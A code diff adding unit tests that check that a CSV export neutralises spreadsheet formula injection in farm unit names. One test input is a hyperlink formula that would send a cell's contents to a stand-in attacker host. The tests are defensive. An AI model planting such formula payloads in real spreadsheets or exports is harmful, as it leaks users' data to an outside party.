@@ -74,6 +74,28 @@ describe('inviteExampleCsv (issue #456)', () => {
 		});
 	});
 
+	it('defuses a unit name a spreadsheet would read as a formula, and still reads it back (docs/security.md § CSV exports)', () => {
+		const evil = '=HYPERLINK("https://evil.example/?"&A1,"Open")';
+		const csv = inviteExampleCsv([{ name: evil }, { name: '@SUM(1)' }]);
+		const farmCells = csv
+			.split('\r\n')
+			.slice(1, 3)
+			.map((l) => l.slice(l.indexOf(',') + 1, l.lastIndexOf(',')).replace(/^"/, ''));
+		for (const cell of farmCells) expect(cell).toMatch(/^'[=@]/);
+		expect(parseFarmerCsv(csv).rows.map((r) => r.farm)).toEqual([evil, '@SUM(1)']);
+	});
+
+	it('defuses a name with whitespace before the formula sign too, and reads it back (issue #902)', () => {
+		const csv = inviteExampleCsv([{ name: ' =1+1' }, { name: '＋SUM(1)' }]);
+		const farmCells = csv
+			.split('\r\n')
+			.slice(1, 3)
+			.map((l) => l.slice(l.indexOf(',') + 1, l.lastIndexOf(',')).replace(/^"/, ''));
+		for (const cell of farmCells) expect(cell.startsWith("'")).toBe(true);
+		// Read back without the apostrophe; the reader trims a cell, as the API trims a name.
+		expect(parseFarmerCsv(csv).rows.map((r) => r.farm)).toEqual(['=1+1', '＋SUM(1)']);
+	});
+
 	it('has one placeholder row when the project has no named units', () => {
 		expect(parseFarmerCsv(inviteExampleCsv([{ name: ' ' }])).rows).toEqual([{ line: 2, email: 'farmer1@example.com', farm: 'Hydrological unit name', locale: 'en' }]);
 	});
